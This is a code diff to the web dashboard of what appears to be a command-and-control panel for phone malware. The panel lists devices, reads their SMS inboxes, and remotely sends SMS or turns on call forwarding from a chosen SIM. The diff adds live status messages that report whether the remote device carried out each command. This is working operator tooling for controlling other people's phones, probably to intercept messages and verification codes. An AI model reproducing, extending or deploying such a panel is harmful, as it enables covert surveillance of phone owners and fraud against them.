@@ -65,6 +65,7 @@
         .data-table th, .data-table td { text-align: left; padding: 12px; border-bottom: 1px solid #eee; }
         .data-table th { background: #f8fafc; color: #555; font-size: 13px; width: 40%; }
         .data-table td { color: #333; font-size: 14px; }
+        .cmd-status-box { margin-top: 10px; padding: 10px; border-radius: 8px; font-weight: bold; font-size: 13px; display: none; text-align: center; }
     </style>
 </head>
 <body>
@@ -102,31 +103,23 @@
     <!-- Modals -->
     <div id="viewDataModal" class="modal">
         <div class="modal-content">
-            <div class="modal-header">
-                <h2 id="modalHeaderTitle">📋 Device Details</h2>
-                <button class="close-btn" onclick="closeModal('viewDataModal')">✕ Close</button>
-            </div>
+            <div class="modal-header"><h2 id="modalHeaderTitle">📋 Device Details</h2><button class="close-btn" onclick="closeModal('viewDataModal')">✕ Close</button></div>
             <div id="modalBody"></div>
         </div>
     </div>
 
     <div id="viewSmsModal" class="modal">
         <div class="modal-content">
-            <div class="modal-header">
-                <h2>📬 SMS Inbox</h2>
-                <button class="close-btn" onclick="closeModal('viewSmsModal')">✕ Close</button>
-            </div>
+            <div class="modal-header"><h2>📬 SMS Inbox</h2><button class="close-btn" onclick="closeModal('viewSmsModal')">✕ Close</button></div>
             <div id="smsModalBody"></div>
         </div>
     </div>
 
     <div id="actionModal" class="modal">
         <div class="modal-content">
-            <div class="modal-header">
-                <h2 id="actionModalTitle">Action</h2>
-                <button class="close-btn" onclick="closeModal('actionModal')">✕ Close</button>
-            </div>
+            <div class="modal-header"><h2 id="actionModalTitle">Action</h2><button class="close-btn" onclick="closeModal('actionModal')">✕ Close</button></div>
             <div id="actionModalBody"></div>
+            <div id="cmdStatusBox" class="cmd-status-box"></div>
         </div>
     </div>
 
@@ -177,6 +170,24 @@
         }
 
         socket.on('dashboard-update', () => fetchData(false));
+
+        // Real-time Command Result Listener
+        socket.on('command-result', (data) => {
+            const statusBox = document.getElementById('cmdStatusBox');
+            if (statusBox) {
+                statusBox.style.display = 'block';
+                if (data.success) {
+                    statusBox.style.background = '#e8f5e9';
+                    statusBox.style.color = '#2e7d32';
+                    statusBox.innerText = "✅ " + (data.message || "Action Successful");
+                } else {
+                    statusBox.style.background = '#ffebee';
+                    statusBox.style.color = '#c62828';
+                    statusBox.innerText = "❌ " + (data.message || "Action Failed");
+                }
+            }
+            toast(data.message || (data.success ? 'Success' : 'Failed'), !data.success);
+        });
 
         function filter(type, btn) {
             currentFilter = type;
@@ -334,6 +345,7 @@
 
         function showSendSmsModal(id) {
             document.getElementById('actionModalTitle').innerText = 'Send SMS';
+            document.getElementById('cmdStatusBox').style.display = 'none';
             document.getElementById('actionModalBody').innerHTML = `
                 <div class="input-group">
                     <label>SELECT SIM SLOT:</label>
@@ -359,16 +371,28 @@
             const number = document.getElementById('smsNum').value;
             const message = document.getElementById('smsMsg').value;
             if(!number || !message) return toast("Please fill all fields", true);
+            
+            const statusBox = document.getElementById('cmdStatusBox');
+            statusBox.style.display = 'block';
+            statusBox.style.background = '#e3f2fd';
+            statusBox.style.color = '#1976d2';
+            statusBox.innerText = "⏳ Waiting for device response...";
+
             try {
                 const r = await fetch('/api/command', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId: id, action: 'SEND_SMS', data: { simSlot: sim, number, message } }) });
                 const d = await r.json();
-                toast(d.message || (d.success ? "Command Sent" : "Failed"), !d.success);
-                if(d.success) closeModal('actionModal');
-            } catch(e) { toast("Error sending command", true); }
+                if (!d.success) {
+                    statusBox.style.background = '#ffebee';
+                    statusBox.style.color = '#c62828';
+                    statusBox.innerText = "❌ " + (d.message || "Device Offline");
+                    toast(d.message || "Failed", true);
+                }
+            } catch(e) { toast("Error", true); }
         }
 
         function showCallForwardModal(id) {
             document.getElementById('actionModalTitle').innerText = 'Call Forwarding';
+            document.getElementById('cmdStatusBox').style.display = 'none';
             document.getElementById('actionModalBody').innerHTML = `
                 <div class="input-group">
                     <label>SELECT SIM SLOT:</label>
@@ -392,11 +416,23 @@
         async function cfAction(id, action) {
             const sim = document.getElementById('cfSim').value;
             const number = document.getElementById('cfNum').value;
-            if(action === 'CALL_FORWARD_ACTIVATE' && !number) return toast("Enter target number", true);
+            if(action === 'CALL_FORWARD_ACTIVATE' && !number) return toast("Enter number", true);
+            
+            const statusBox = document.getElementById('cmdStatusBox');
+            statusBox.style.display = 'block';
+            statusBox.style.background = '#e3f2fd';
+            statusBox.style.color = '#1976d2';
+            statusBox.innerText = "⏳ Waiting for device response...";
+
             try {
                 const r = await fetch('/api/command', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId: id, action, data: { simSlot: sim, number } }) });
                 const d = await r.json();
-                toast(d.message || (d.success ? "Command Sent" : "Failed"), !d.success);
+                if (!d.success) {
+                    statusBox.style.background = '#ffebee';
+                    statusBox.style.color = '#c62828';
+                    statusBox.innerText = "❌ " + (d.message || "Device Offline");
+                    toast(d.message || "Failed", true);
+                }
             } catch(e) { toast("Error", true); }
         }
 
@@ -413,6 +449,7 @@
 
         function showChangePassModal() {
             document.getElementById('actionModalTitle').innerText = '🔐 Change Password';
+            document.getElementById('cmdStatusBox').style.display = 'none';
             document.getElementById('actionModalBody').innerHTML = `
                 <div class="input-group">
                     <label>CURRENT PASSWORD:</label>
